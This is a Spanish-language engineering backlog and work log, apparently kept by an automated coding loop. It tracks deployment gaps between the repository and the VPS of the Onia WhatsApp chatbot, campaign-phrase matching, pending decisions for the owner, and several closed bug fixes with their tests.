conversaciones, cinco sin contacto) es justo el que le faltaba a la condición de §9 *"hasta que la limitación moleste"*, y ya vive acá. **Y el `5 de las 9` que esta fila decía estaba viejo**: eran seis. | Es decidir en qué bandeja aterrizan los desconocidos de la web | **La otra mitad del objetivo del carril.** Hecho = se abre `/inbox` y se ve la conversación 45 (*"tengo una ferreteria"*) |
| S15 | **Una credencial de sólo lectura para que el canario ENTRE al panel del chatbot** — un usuario del producto (correo + contraseña) que sólo mire. Se enchufa como `ONIA_CANARIO_USER` / `ONIA_CANARIO_PASS` en el entorno del loop `canario-visual`; **no hay una línea de código pendiente**: `requiereSesion` y `iniciarSesion()` ya están en `scripts/canario_visual.mjs` y entran por el formulario real de `/login`. Sin ella el canario NO miente (desde hoy dice `NO MEDIDA` con el motivo), pero **la pantalla que un cliente usa para editar su conocimiento sigue sin que nadie la mire nunca**. ⚠️ La otra opción que el ítem original proponía —una ruta de vista previa pública— **se descarta**: expone configuración de cliente sin sesión, y es agregar una superficie viva | Es un alta de usuario en producción, y una contraseña | Que `/settings/chatbot` entre a la ronda del canario como las otras diez. Hecho = el canario imprime `panel-chatbot … sin disparo mecanico` y su baseline se crea con `urlFinal` = `/settings/chatbot` |
| ~~S16~~ | ✅ **VENCIDO el 2026-09-02 — Sergio no decide nada: la decisión ya se tomó y el trabajo ya llegó.** Pedía elegir entre cambiar el procedimiento del integrador, mergear a mano, o dejarlo. Pasaron **las dos primeras**: el integrador arregló su Paso 1 (`d26444c1` de `onia-hermes`, *"contaba las ramas contra el repo equivocado"*) y mergeó el carril a `master` de `onia-platform` (`503af44`, 12:38 UTC). Verificado con `git fetch` fresco y `merge-base --is-ancestor`: **los cuatro** commits declarados (`22fd088`, `675541b`, `d62beeb`, `e644c85`) llegan a `origin/master`; `npm run deploy:alcanzable` sale **0**. El radar §23 ya figuraba **RESUELTO** — sólo esta fila seguía pidiendo la decisión. Detalle en el primer ítem de "Cerrado". | — | — |
| S6 | **Proyecto Supabase cloud `Dental-gest` (`kvepqgikokjlacxngkiw`) sigue ACTIVE_HEALTHY** — decidir pausar o borrar. Y si algún día se reactiva `Gesti-Os` (`jafxylfocvvlflpqfsix`), **rotar su `service_role` primero**: estuvo expuesto en los JSON de n8n que se redactaron el 29-ago | Es plata y es borrado de datos | Cerrar la cola del saneamiento de secretos |

### S9 — el ítem completo, movido de "Ahora" el 2026-08-31

> Vivió diez vueltas en "Ahora" esperando un `scp` que sólo Sergio puede hacer, y cada
> vuelta le agregaba un párrafo que repetía la misma medición. Se mueve entero acá con su
> número: **un ítem bloqueado se vuelve a mirar cuando Sergio avisa, no cada 20 minutos.**
> Se borraron las cinco relecturas que sólo decían "sin cambios" (5ª, 6ª, 7ª, 8ª y 10ª
> vuelta); lo que cada una aportaba de verdad ya vive en la fila S9 de arriba o en Cerrado.
> Vuelve a "Ahora" el día que S9 se haga, con lo que queda: probar las frases MIRANDO.

**2 · Las frases que la web YA manda no están registradas como campañas: el desconocido
pregunta una cosa y el bot le contesta el saludo genérico.** Las frases de campaña se
construyeron ayer (`hermes-content/deploy/vps-ops/bot/recepcionista.mjs:117`
`campanaExacta`, espejo en `lib/chatbot/knowledge.ts:101`, deployadas en el commit
`e5c1ad3`) y **no las usa nadie**: cero campañas publicadas en ningún documento.
Mientras tanto onia.com.bo manda **seis frases fijas distintas** al mismo número, todas
desde `web-factory/apps/onia-platform/src/lib/site.ts` — "Hola, quiero conocer Onia"
(línea 41), "Hola, vengo de la web de Onia. Quiero saber si me sirve para mi negocio."
(49), y las tres de comercio/servicios/importadoras (52-58), más las de los
configuradores de servicios. Cada una es una intención declarada — la persona ya dijo
qué quiere antes de escribir — y el bot la trata a todas igual.
**Por qué es el ítem barato de mayor valor:** no hay que construir nada. La capacidad
existe, la distribución existe, el número atiende. Falta escribir el documento.
**Hecho =** las frases cargadas como campañas desde el panel
(`app/(dashboard)/settings/chatbot/EnsenaleConversando.tsx` las crea hablando),
publicadas, y las seis contestadas con su respuesta propia — probado por el probador
real y MIRADO.
⚠️ **No se toca `web-factory/apps/onia-platform/src/lib/site.ts`**: es del carril
web-factory. Las frases se copian tal cual están hoy; si alguna cambia allá, la campaña
deja de matchear y hay que re-copiarla.

⚙️ **Vuelta del 2026-08-31 — el documento está escrito, validado y con su guardia; lo que
falta NO es escribirlo.** Gate 1 primero, en vivo: `/opt/onia/bot/knowledge.json` del VPS
(leído por SSH, 904 bytes, del 6-ago) **no tiene `campanas`** — el hueco existe hoy.
**Corrección al ítem: no son seis frases vivas, son CINCO — y sólo cuatro las manda la web
de verdad.** Medido contra producción con `curl`, no leyendo el repo:
| frase | dónde | ¿la manda la web hoy? |
|---|---|---|
| "Hola, vengo de la web de Onia. Quiero saber si me sirve para mi negocio." | `WA_URL_LANDING` | **sí** — portada, /precios, /empezar, /contacto, /nosotros, /facturacion, /chatbot |
| "…Quiero consultoría/capacitación en IA para mi empresa." | `/servicios/consultoria` | **sí** |
| "…Quiero una propuesta de marketing con IA para mi negocio." | `/servicios/marketing-ia` | **sí** |
| "Hola, vengo de la página del chatbot de Onia. Tengo una consulta antes de elegir el stack." | `/v1/chatbot` | **sí** |
| "Hola, quiero conocer Onia" | `WA_URL`, `web-factory/apps/onia-platform/src/lib/site.ts:41` | **no**: export sin un solo consumidor |
| "Hola, quiero que me avisen cuando Onia para comercio/servicios/importadoras esté listo" | `WA_TEXT_*`, `web-factory/apps/onia-platform/src/lib/site.ts:52` | **no**: los tres son exports muertos, nadie los importa |
| "Hola, mi rubro no está en la lista de Onia. Mi negocio es: " | `/v1/empezar` | sí, pero es un **prefijo** — la persona escribe su rubro atrás, así que jamás puede ser match exacto |
Las tres "avisen cuando esté listo" además chocan con `MODULOS_LISTOS`
(`hermes-content/deploy/vps-ops/bot/config.mjs:408`): comercio y proveedores **ya están listos**. Que sean código muerto
refuerza la 📌 de abajo — no hay que corregir el texto, hay que borrarlo.
**Lo que se hizo:** `hermes-content/docs/chatbot/campanas-onia.knowledge.json` — el
documento de Onia (copia del vivo del VPS) con **5 campañas** (las 4 vivas + `WA_URL`, que
está a un import de volver). Pasa la **compuerta real de publicación**
(`node hermes-content/deploy/vps-ops/bot/knowledge.mjs --check <ruta>` → `OK`, exit 0) y las
cinco respuestas pasan los guardrails. Y su guardia:
`hermes-content/deploy/vps-ops/bot/campanas-web.test.mjs` **extrae las frases del código de
la web** en vez de hardcodearlas, así que el día que web-factory cambie una coma el test se
pone rojo en vez de morir en silencio. Suite del bot **619/619** verde (614 antes).
🔴 **Y apareció el motivo REAL de por qué el ítem no se puede cerrar, que no es el
documento.** `campanaExacta` vive dentro de `recepcionistaStep` (`hermes-content/deploy/vps-ops/bot/recepcionista.mjs:192`), y
el modo recepcionista lo enciende sólo `asRecepcionista`, al que `withKnowledge` llama
**únicamente si la fuente es `"db"`** — la fila publicada de una **org**, resuelta por
`clinic_settings.chatwootInboxId` (`hermes-content/deploy/vps-ops/bot/knowledge.mjs:851`). El +591 75414930 hoy se atiende
desde el **archivo** del VPS, o sea **modo venta, donde las campañas ni se miran**. Corrido
con la misma frase por los dos caminos: archivo → `M0_SIN_HORARIOS` (el saludo genérico que
el ítem describe), db → `R_CAMPANA` con la respuesta propia y `guardrail.ok: true`.
**Cargar las campañas a mano en el VPS no serviría de nada.** El ítem 2 estaba mal
diagnosticado: no le faltaba un documento, le falta **el mismo vínculo org→inbox del ítem
1**. Los dos ítems de Ahora son el mismo bloqueo, y es **S8**. Anotado en
`hermes-content/docs/ONIA_RADAR_DECISIONES_PRODUCTO.md` §9.
**Lo que queda del ítem, cuando S8 se destrabe:** cargar estas 5 campañas en el editor de la
org dueña del inbox 5, publicar, y probar las 4 frases vivas MIRANDO la pantalla.

⚙️ **Vuelta del 2026-08-31 (segunda) — el ítem YA NO depende de S8, y el plan de arriba
estaba equivocado.** Gate 1 sobre el propio diagnóstico, leyendo el motor: `campanaExacta`
se llamaba **sólo** desde `hermes-content/deploy/vps-ops/bot/recepcionista.mjs:192`, y `hermes-content/deploy/vps-ops/bot/bot-engine.mjs:448` corta el modo
recepcionista antes de todo el guion de venta. O sea que el plan escrito arriba —"cargar
las campañas en la org dueña del inbox 5"— **metía el número de Onia en modo recepcionista**,
que es la config del bot de un CLIENTE. Ahí el embudo de leads no existe: lo dice el test
`recepcionista: 'DEMO' NO dispara el funnel — el guion de leads queda exclusivo del modo
venta`. Y `R_CAMPANA` es literalmente `{{respuesta_campana}}` (`hermes-content/deploy/vps-ops/bot/config.mjs:317`), sin un solo
efecto: **se habría cambiado la única línea que produce leads por un texto enlatado.**
**Lo que se hizo en su lugar** — que las campañas también se vean desde el modo venta, que es
donde caen los wa.me?text= de onia.com.bo:
- `hermes-content/deploy/vps-ops/bot/knowledge.mjs` (`applyKnowledge`) ahora lleva `campanas` a la config de los DOS modos.
  `campanaExacta(config, norm)` lee `.campanas`, así que la misma función sirve a ambos sin
  tocarla (el recepcionista le sigue pasando `config.conocimiento`).
- `hermes-content/deploy/vps-ops/bot/bot-engine.mjs`: la frase de campaña se resuelve en el router **antes** de los intents
  difusos (es un match del mensaje ENTERO, la señal más específica que puede llegar) y sale
  por `composeWithFunnel`, el mismo camino que ya usan precio y SIAT. Efecto: la respuesta va
  **detrás** de la bienvenida, no en lugar de ella — se conservan M0 (el bot se declara bot,
  D2), la oferta de horarios y el `lead_upsert`.
- `composeWithFunnel` acepta `vars` (R_CAMPANA es la única plantilla de ese camino cuyo texto
  no está en el guion: lo trae el documento publicado).
**Probado con el documento real, no con un fixture** (las 5 campañas de
`hermes-content/docs/chatbot/campanas-onia.knowledge.json` corridas por el motor en modo venta): las cinco contestan su
propia respuesta y las cinco conservan `lead_upsert` + `notify_sergio`. Antes de este cambio
las cinco daban `M0_SIN_HORARIOS` solo — exactamente el saludo genérico que el ítem denuncia.
**7 tests nuevos** (incluido el guardia de no-regresión "sin campañas publicadas el motor no
cambia" y "el opt-out le gana a la campaña"). Suite del bot **626/626** verde (619 antes).
La compuerta de publicación sigue en `OK` sobre el documento.
⚠️ **Lo único que queda, y es MUCHO más barato que S8:** copiar
`hermes-content/docs/chatbot/campanas-onia.knowledge.json` a `/opt/onia/bot/knowledge.json`
del VPS (hoy tiene 904 bytes y no trae `campanas`) y probar las 4 frases vivas MIRANDO. Eso
es un deploy al VPS ⇒ **OK de Sergio**, pero ya no hace falta decidir dueño de inbox ni
desplegar el producto. **Corrección a S8:** el ítem 2 sale de su lista de desbloqueos.

🔴 **Vuelta del 2026-08-31 (tercera) — S9 estaba MAL ESCRITO, y hacerlo tal como decía no
habría encendido nada.** El párrafo de arriba afirma *"El motor ya las lee en modo venta
(626/626 verde)"*. Eso es cierto **en el espejo del repo** y falso en el VPS: el motor se
verificó localmente y se dio por desplegado sin mirarlo. Medido con md5, los dos lados:
| archivo | espejo del repo | VPS `/opt/onia/bot/` |
|---|---|---|
| `hermes-content/deploy/vps-ops/bot/bot-engine.mjs` | `b5a5c878…` = commit `994eb42d` (campañas) | `7f50f1a9…` = commit `3e3841aa` (comprobantes) |
| `hermes-content/deploy/vps-ops/bot/knowledge.mjs` | `4ba53652…` | `d00a3c1f…` |
| `hermes-content/deploy/vps-ops/bot/campanas-web.test.mjs` | existe | **no existe** |
El VPS quedó **exactamente un commit atrás**: `994eb42d` nunca viajó. Confirmado sin
grep de descarte sino contando en el motor que CORRE (contenedor `onia-center`,
`/tmp/onia-bot/bot-engine.mjs`): **cero apariciones de `campanaExacta`**.
**La consecuencia si Sergio hacía S9 tal como estaba escrito:** copiaba las 5 campañas a
`/opt/onia/bot/knowledge.json`, el motor viejo las ignoraba —no tiene el código que las
lee—, las 4 frases vivas seguían recibiendo el saludo genérico, y el ítem se daba por
cerrado. Un fantasma más, y del tipo caro: uno que se escribe DESPUÉS de que alguien puso
las manos en producción.
**S9 corregido:** no es sólo el documento. Tienen que viajar **`hermes-content/deploy/vps-ops/bot/bot-engine.mjs`,
`hermes-content/deploy/vps-ops/bot/knowledge.mjs`** y el documento a `/opt/onia/bot/knowledge.json`, y hay que **reiniciar** (`hermes-content/deploy/vps-ops/bot/webhook-server.sh`
recopia al contenedor sólo cuando cambia su STAMP).
**Lo construido para que esto no vuelva a pasar** — porque ya pasó dos veces, las dos
descubiertas de casualidad y en direcciones opuestas (`d334d776`: el espejo quedó 25
archivos atrás del VPS; hoy: el VPS quedó atrás del espejo):
`hermes-content/deploy/vps-ops/bot/espejo-check.mjs` — un md5 por lado, sólo lectura, sin
tocar el VPS. Sale 0 si el código coincide y 1 nombrando los archivos si no.
El documento publicado y los `webhook.env*` quedan fuera del veredicto **a propósito**: son dato
vivo, no código, y un gate que siempre está rojo lo apaga alguien.
**Corrido contra producción**, que es la prueba de que sirve:
```
ESPEJO DESINCRONIZADO — …/vps-ops/bot/ vs root@187.77.16.63:/opt/onia/bot
  DISTINTOS (el VPS corre otra version): bot-engine.mjs, bot-engine.test.mjs, knowledge.mjs
  FALTAN EN EL VPS (deploy a medias):    campanas-web.test.mjs, recepcionista.test.mjs
```
8 tests nuevos (`hermes-content/deploy/vps-ops/bot/espejo-check.test.mjs`), uno de ellos con los md5 REALES de hoy: si ese
caso pasara en verde, el gate no serviría. Suite del bot **634/634** (626 antes).
📎 **Trampa que costó tres consultas y queda escrita en el encabezado del script:** el
motor vive en TRES lugares —espejo, `/opt/onia/bot` del host, y `/tmp/onia-bot` **dentro
del contenedor `onia-center`**, que es el que corre—. `ps` en el host muestra
`node /tmp/onia-bot/webhook-server.mjs` y ese directorio **no existe en el host**: es el
`/tmp` del contenedor. El 3 se rehace solo del 2 por el STAMP de `hermes-content/deploy/vps-ops/bot/webhook-server.sh`, así
que alinear el 2 es lo que el próximo restart lleva al bot vivo.

✅ **Gate 1 del 2026-08-31 (cuarta vuelta) — el motor YA VIAJÓ; queda SOLO el documento.**
La tabla de md5 de arriba quedó vieja y hacía perder la vuelta: `espejo-check.mjs` corrido
hoy contra producción sale **0 — `ESPEJO OK`**, o sea que `bot-engine.mjs`, `knowledge.mjs`
y `run-turn.mjs` del VPS ya son los del repo. Y verificado donde importa, en el motor que
**corre** y no en el host: `docker exec onia-center grep -c campanaExacta
/tmp/onia-bot/bot-engine.mjs` da **2**, cuando la vuelta anterior contó **0**.
**Lo que sigue faltando, medido dentro y fuera del contenedor:** `knowledge.json` está en
**904 bytes del 6-ago y sin `campanas`** en los dos lugares. O sea que el motor sabe leer
campañas y el archivo del número no trae ninguna — las 4 frases vivas de onia.com.bo
siguen recibiendo el saludo genérico, pero por UNA razón y no por cuatro.
**S9 quedó en un archivo de datos:** copiar
`hermes-content/docs/chatbot/campanas-onia.knowledge.json` a `/opt/onia/bot/knowledge.json`
y reiniciar. Sigue siendo un deploy ⇒ **OK de Sergio**.

⚙️ **Vuelta del 2026-08-31 (novena) — el CTA de `/v1/empezar` ya no puede tener campaña
"nunca": ahora la tiene. Y el mismo cambio destapó que S9, tal como estaba escrito, HOY
ROMPE producción.**
**Gate 1 primero, en el motor y no en el papel.** La tabla del ítem declara una de las
frases vivas como imposible: *"Hola, mi rubro no está en la lista de Onia. Mi negocio es: "*
es un **prefijo** — la persona escribe su rubro atrás, así que el mensaje entero nunca es
igual a la frase. Estaba escrito como decisión, con su motivo, en `NO_MATCHEABLES` de
`hermes-content/deploy/vps-ops/bot/campanas-web.test.mjs`. Verificado que sigue viva hoy,
con `curl` a producción y no leyendo el repo:
`https://onia.com.bo/v1/empezar` renderiza
`wa.me/59175414930?text=Hola%2C%20mi%20rubro%20no%20est%C3%A1...Mi%20negocio%20es%3A%20`.
Y medido en el motor, las dos variantes contestaban **`M0` pelado**: quien MÁS información
declaró —su rubro, y que no está en la lista— recibía exactamente lo mismo que quien
escribe "hola".
**Lo que se hizo, y es opt-in por campaña a propósito:** una campaña puede declarar
`prefijo: true` y entonces matchea también cuando el mensaje **sigue**
(`hermes-content/deploy/vps-ops/bot/recepcionista.mjs`, `campanaExacta`). Sin el campo, el
match sigue siendo del mensaje entero — una campaña normal no se estira sola. El match
exacto **le gana siempre** al prefijo, y entre dos prefijos gana la frase más larga; el
límite es un espacio, así que `mi negocio es` no se come `mi negocio establecido`.
`prefijo` agregado al esquema (`knowledge.mjs`) y la **sexta campaña** al documento
(`hermes-content/docs/chatbot/campanas-onia.knowledge.json`, `version` → `2026-08-31.2`),
que sigue pasando la compuerta real de publicación (`--check` → `OK`, exit 0).
**Probado con el documento REAL corrido por el motor**, no con un fixture: las dos
variantes (`…Mi negocio es: panadería` y el prefijo pelado) salen ahora **`M0` + `R_CAMPANA`
con `lead_upsert`**, y `hola` sigue saliendo `M0` solo — o sea que no se le comió el flujo
normal a nadie. **6 tests nuevos**, y se comprobó que pueden fallar: apagando la rama del
prefijo, 2 se ponen rojos nombrando el caso. Suite del bot **682/682** (676 antes).
🔴 **Y lo que más vale de esta vuelta, que es un hallazgo sobre S9 y no sobre el prefijo.**
El esquema del validador **rechaza claves desconocidas**, y `parseKnowledge` devuelve
`data: null` cuando el veredicto no es `ok` — o sea que un documento rechazado no carga
"a medias": **no carga nada**. Bajado el `knowledge.mjs` que HOY corre en el VPS
(41.423 bytes, cero `prefijo`) y corrido su propio `validateKnowledge` contra el documento
nuevo:
```
ok= false
errors= ["campanas[4].prefijo: clave desconocida (el esquema no la acepta)"]
```
**Si S9 se hace como estaba escrito —copiar sólo `knowledge.json`— el motor viejo tira el
documento ENTERO:** no quedan 5 campañas andando y 1 ignorada, quedan **cero**, y además
se pierden la FAQ `siat` y el horario que hoy sí están vivos. Sería un deploy que empeora
producción, hecho siguiendo la instrucción al pie. **S9 corregido ARRIBA, en su fila: viajan TRES
archivos.**


---

## Cerrado — no rehacer

- [x] **La sonda tapaba a los cuatro leads reales que este carril existe para que se vean.**
      Cerrado el 2026-09-12, `scripts/sonda_widget.mjs` (rama del carril — falta que el
      integrador lo mergee; **no necesita deploy**: la sonda corre desde el repo).
      No estaba en la cola: salió del chequeo de "hecho" del arranque, que es de donde tiene
      que salir. Medido en el inbox 4 —el de los leads REALES— antes del arreglo:

      ```
      49 | 2026-09-12 | Sonda QA carril chatbot   ← nosotros, status=0 (abierta)
      48 | 2026-09-02 | cold-pond-731             ← desconocido de verdad
      40 | 2026-08-29 | lively-night-474
      36 | 2026-08-27 | icy-lake-546
      34 | 2026-08-24 | delicate-glitter-674
      ```

      La sonda corre cada 30 min y Chatwoot ordena por actividad: su conversación encabezaba
      la bandeja **para siempre**. El objetivo del carril es *"que un desconocido escriba y esa
      conversación SE VEA en la bandeja"* — el instrumento estaba tapando justo lo que mide.
      **Había limpieza, pero sólo al ARRANCAR y sólo a medias**: `dejarComoExtrano` resolvía por
      Rails únicamente si `necesitaDesarme` daba true, o sea si el bot había quedado en
      `handoff_humano`. En la vuelta normal el bot queda en `nuevo`, eso da false, y no se
      resolvía nada. Preparar el sujeto no es lo mismo que devolverlo — y la entrada que dejé en
      la memoria compartida el 11-sep decía la regla correcta con el código a medio arreglar.
      Arreglo: `cerrarSujeto()` + `correrConCierre()`, con el cierre en un `finally` para que
      corra con veredicto 0, con veredicto 1 (bot mudo) y también si la medición TIRA — en los
      tres casos la sonda ya reabrió su conversación. Las dos deps van **inyectadas y sin
      default**: el default de una dep inyectable es el efecto real, y un caso distraído habría
      corrido el `rails runner` contra la Chatwoot viva pasando en verde.
      Seis casos nuevos en el self-check (`npm run test:sonda-widget`, que está en la cadena).
      De paso, el runner del self-check no hacía `await`: un caso `async` devolvía una promesa
      que su `try` no podía atrapar e imprimía `ok` con el assert perdido — tres de los casos
      nuevos habrían sido decorativos.
      Validado por mutación: sacar el `cerrar()` del `finally` → 2 FALLA; que el cierre no
      resuelva → 4 FALLA. **Efecto en vivo**: la 49 pasó a `status=1` y la bandeja abierta del
      inbox 4 quedó con los cuatro desconocidos reales y nada nuestro encima.

- [x] **La cuenta vencida seguía cancelando citas por WhatsApp.** Cerrado el 2026-09-11,
      `6aba5bc` (rama del carril — **falta que el integrador lo mergee y falta desplegar**).
      No estaba en la cola: salió de auditar la puerta pública que es de este carril.
      El panel corta sus 35 escrituras con `checkPlanExpiry` y la reserva pública se cerró
      el 08-sep con ese mismo motivo; `lib/agenda/reserva-publica.ts` **nombra al bot de
      WhatsApp como la superficie hermana**, pero sólo cerró el eje RUBRO. El eje VENCIDA
      quedó abierto acá — media familia cubierta se lee como familia cubierta.
      Medido sobre `lib/whatsapp-bot.ts` (415 líneas, el motor detrás del webhook): **cero**
      menciones de `isWriteBlocked`, `checkPlanExpiry`, `planEnd` o `trialEnd`. Su único
      corte —el paso rotulado «Check plan limits»— es `checkWhatsAppAddon`, que pregunta por
      el add-on y por el cupo del mes, nunca por si la suscripción está viva (`plan` es el
      plan CONTRATADO, no el estado). Y esta puerta **escribe**: cancela citas
      (`status: "CANCELADA"`), las confirma, abre sesiones y escala a un humano. Al dueño con
      el panel en solo lectura le seguían cancelando citas que él no puede gestionar, y cada
      respuesta gastaba Meta y OpenAI en una cuenta que dejó de pagar.
      Hoy **no muerde** —ninguna org de producción tiene `whatsappPhoneNumberId`, medido en
      `supabase-db`— pero es un arma cargada: `clinica-sergio-p2ljs` tiene el add-on activo y
      su trial vence el **17-sep**.
      Arreglo: `lib/whatsapp/atiende-el-bot.ts`, que pregunta con `isWriteBlocked` —el MISMO
      corte del panel, así la gracia del trial vale igual y un alta manual sin fechas sigue
      atendiendo—. El gate trae el caso del **llamador** y se validó por mutación en tres
      direcciones; la del esquive pasaba en VERDE (ver la lección, abajo).
      Reproducción: `npx vitest run lib/whatsapp/atiende-el-bot.test.ts` (11 casos).

- [x] **El disco que bloqueaba el build: el ítem describía una máquina que ya no es donde
      corremos.** Cerrado el 2026-09-07 midiendo, no razonando. Decía «0 bytes libres de
      465 GB» y «`onia-platform` tiene **30 worktrees**, 13 con su propio `node_modules`».
      Medido hoy en la máquina donde de verdad corren los loops (nodo-casa, WSL): `df -h /`
      da **1007 GB, 62 usados, 7%** — 895 GB libres; `/mnt/c` está al 58%; y hay **DOS**
      carpetas `onia-platform*` en `/root/loops`, no 30, con un solo `.next` (221 MB) que sí
      tiene `node_modules` al lado, o sea que puede reconstruirse: no es la basura que el
      ítem mandaba a barrer.
      **Por qué envejeció sin que nadie lo notara:** describía la máquina Windows de la app
      de Claude Code, y los loops se mudaron al VPS el 01-sep y a nodo-casa el 05/06-sep. El
      ítem no estaba mal cuando se escribió; dejó de tener sujeto.
      **Lo que sí quedó cubierto:** esta máquina tiene el vigía `onia-vigia-disco.sh` en su
      crontab (`41 * * * *`, umbral 85%) con el motivo escrito — si se llena, se caen los
      cuatro loops, incluido `onia-cola`, que es el único camino a `main`.

- [x] 🔴 **El bot adelantaba UN DÍA el plazo fiscal, y los DOS gates del tema exigían la fecha
      equivocada.** Cerrado el 2026-09-06 (`85a3f41d2`). Archivos:
      `hermes-content/deploy/vps-ops/bot/knowledge.onia.json`,
      `hermes-content/docs/chatbot/campanas-onia.knowledge.json`,
      `hermes-content/deploy/vps-ops/bot/fecha-que-caduca.test.mjs`, `evals/evals.test.mjs`.
      **Cómo apareció:** midiendo el objetivo al arrancar. El simulador dio 3/3 y en la respuesta
      del SIAT decía *"desde el 30 de septiembre es obligatoria"*. El plazo real es el **1 de
      octubre de 2026** (RND 102600000007, grupos 9.º al 12.º), que es lo que
      `onia.com.bo/facturacion` publica citando la resolución.
      **Por qué sobrevivió, y es lo único que vale la pena recordar:** no faltaba un gate — había
      **dos** y los dos pedían el dato equivocado (`fecha-que-caduca.test.mjs` con
      `/30 de septiembre/`, y `evals` E04 igual). Los escribí el 05-sep mirando si el dato
      **vencía**; ninguno miró si era **cierto**. Un gate que verifica la propiedad de al lado no
      es neutral: protege el defecto y le pone cara de verde.
      **Y estaban TRES copias** — el default de `config.mjs` ya estaba sano desde el 05-sep, así
      que aquel arreglo tocó una variante y dejó las hermanas vivas. Es la misma familia que ya
      mordió en este carril (M0/M0_SIN_HORARIOS).
      **Prueba:** 7/7 en `fecha-que-caduca`, 12/12 en `evals` (E04 incluido), y el simulador
      contra `knowledge.onia.json` —el artefacto que producción carga— sirviendo el texto nuevo.
      `vigenteHasta` pasó a 2027-09-30: con la redacción durable, vencerlo el 30-sep callaba el
      dato justo el día que entra en vigor.
      ⚠️ **Commiteado, NO desplegado.** El bot vivo corre desde `/opt/onia/bot` (rsync, no
      checkout): hasta que se despliegue, producción sigue diciendo la fecha vieja.

- [x] **Las CUATRO cifras del carril daban en meta con el bot vivo sin el corte de anticipación:
      ninguna mira el proceso que corre.** Cerrado el 2026-09-05. Archivos:
      `hermes-content/deploy/vps-ops/bot/anticipacion-viva.mjs` (nuevo), `package.json`.
      **Cómo apareció:** midiendo el objetivo al arrancar. Simulador 3/3, widget 2/2, avisos
      circuito ok y rubros 5/5 — las cuatro verdes — mientras
      `docker exec onia-center grep -c ANTICIPACION_MINIMA_MS /tmp/onia-bot/config.mjs` daba **0**
      contra **2** en la rama. Las tres primeras cifras miran si SALE un mensaje; la de rubros mira
      el **árbol**. Ninguna mira lo que el proceso vivo tiene cargado.
      **Lo que el gate separa, y es el punto:** los **horarios de hoy** del **corte que los
      protege**. A las 14:06 La Paz producción ofrecía 47,9 h y 71,9 h de aviso — sanos, pero por el
      cron de las 10:23 UTC, no por el corte. Sin el corte desplegado, el día que ese cron no corra
      el valor envejece hasta el pasado y vuelve el defecto del 04:03 (una demo a 4 h 57 min).
      Por eso **horarios ok + corte ausente NO es verde**: es el mismo modo de falla que ya costó
      una vuelta en `avisos-vivo.mjs` (circuito aparte de eventos).
      **Prueba:** el `--self-check` cazó un bug propio antes de que saliera — leía `slot.sostenible`
      y el campo real es `pending` (invertido, `config.mjs:66`), así que marcaba **CORTO** a los dos
      horarios de 47,9 h y 71,9 h: un rojo con el texto de un defecto real sobre horarios sanos,
      que habría mandado a "arreglar" lo que ya estaba bien. Corregido, 6/6 casos en verde probados
      en las dos direcciones, guarda de import verificada en proceso hijo. Cableado a la cadena
      `npm test` **sólo el `--self-check`** (el modo vivo necesita docker: en la cadena sería el
      rojo falso que traba el merge de los 15 carriles). Los 8 gates posteriores a `test:sitio-venta`
      corridos uno por uno, los 8 en verde.
      ✅ **DESPLEGADO — verificado el 2026-09-10 22:46 La Paz con su propio gate.**
      `node hermes-content/deploy/vps-ops/bot/rubros-vivos.mjs` → **exit 0**, *"el bot ofrece
      exactamente lo que se vende"*: producción vende 5 (`dentagest-clinical`, `gestios-general`,
      `proveegest-electrico`, `esteticagest-clinical`, `gestios-servicios-profesionales`) y el bot
      ofrece 5 (dental, comercio, proveedores, servicios, estética). El gate ya no da 1: daba 1
      **a propósito** hasta el swap, y el swap ocurrió.

- [x] **El bot decía "no tengo horarios libres" y dos turnos después ofrecía el que acababa de
      descartar.** Cerrado el 2026-09-05, en la misma vuelta en que se encontró. Commit
      `d6a699205`. Archivos: `hermes-content/deploy/vps-ops/bot/reply-builder.mjs`,
      `bot-engine.test.mjs`.
      **Cómo apareció:** corriendo el simulador del chequeo de arranque contra los `ONIA_BOT_SLOTS`
      reales de `/opt/onia/bot/webhook.env`. La bienvenida salía *"Justo ahora no tengo horarios
      libres para ofrecerte"* y la respuesta de facturación cerraba con *"¿Te reservo **sábado 5 de
      septiembre, 09:00** o **lunes 7 de septiembre, 14:00**?"* — el sábado era **ese mismo día**.
      **La causa:** las dos ramas leen el mismo flag `pending` con **polaridad opuesta** —
      `slotsPending()` (ALGUNO pending → `M0_SIN_HORARIOS`) contra `hayHorarioReal()` (ALGUNO real
      → `PENDING_HORARIO`, que pone las DOS etiquetas). Mientras `pending` fue todo-o-nada (los dos
      placeholders de `DEMO_SLOTS`) las dos decían lo mismo; el corte por anticipación que entró la
      vuelta anterior (`375b8af08`, `ANTICIPACION_MINIMA_MS`) lo volvió un estado **por horario** y
      ahí el desacuerdo salió a la superficie. Es el arreglo de ayer aplicado a una variante y no a
      su hermana — el modo de falla que este carril ya tiene escrito.
      **Barrido completo, no sólo donde saltó:** las otras tres superficies que muestran horarios ya
      cortaban con la polaridad buena y se verificaron una por una — bienvenida y `M0b`
      (`slotsPending`), barrido de follow-up (`followup-run.mjs:283`) y plantilla **paga**
      (`followUpTemplate:186`, `.some(pending) → null`). El único agujero era `hayHorarioReal`.
      **Prueba:** test `"HORARIO VENCIDO"` en rojo primero por el motivo correcto (ofrecía el
      sábado), verde después; **834** del bot y la cadena `npm test` en verde.
      ✅ **DESPLEGADO — verificado el 2026-09-10 22:46 La Paz.** El MISMO comando que el texto
      anterior citaba en **0** hoy da **2**:
      `docker exec onia-center grep -c ANTICIPACION_MINIMA_MS /tmp/onia-bot/config.mjs`.
      Y el gate vivo lo confirma del lado de la promesa:
      `node hermes-content/deploy/vps-ops/bot/anticipacion-viva.mjs` → *"sábado 12 de septiembre,
      09:00 — 34.2 h de aviso · lunes 14, 14:00 — 87.2 h · corte de 24 h en el código vivo: sí"*.
      Ya no hay forma de repetir la demo a 2 h 48 min de la conversación 49.

- [x] **La guarda de entrada de `espejo-check.mjs` reventaba al importarlo, y el molde ya se había
      copiado a otro gate.** Hecho el 2026-09-02, en la misma vuelta en que se encontró.
      Archivos: `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`, `scripts/s11_desplegado.mjs`.
      La guarda armaba la URL a mano —`new URL("file://" + process.argv[1])`— y con
      `node -e "import(...)" <arg>` el `argv[1]` es el **argumento**, no una ruta: tira
      `ERR_INVALID_URL` y el módulo no se puede importar. Apareció al probar el verificador nuevo
      de S11, que había copiado esa guarda de acá; reproducido después sobre el original. Va con
      `pathToFileURL`, que además resuelve solo el escapado y las barras invertidas, así que se
      cae el `replace(/\\/g,"/")` a mano. Verificado que sigue corriendo como programa —**S9
      depende de él** y sigue dando 1— y que ahora sí se importa. Suite: **21/21**.

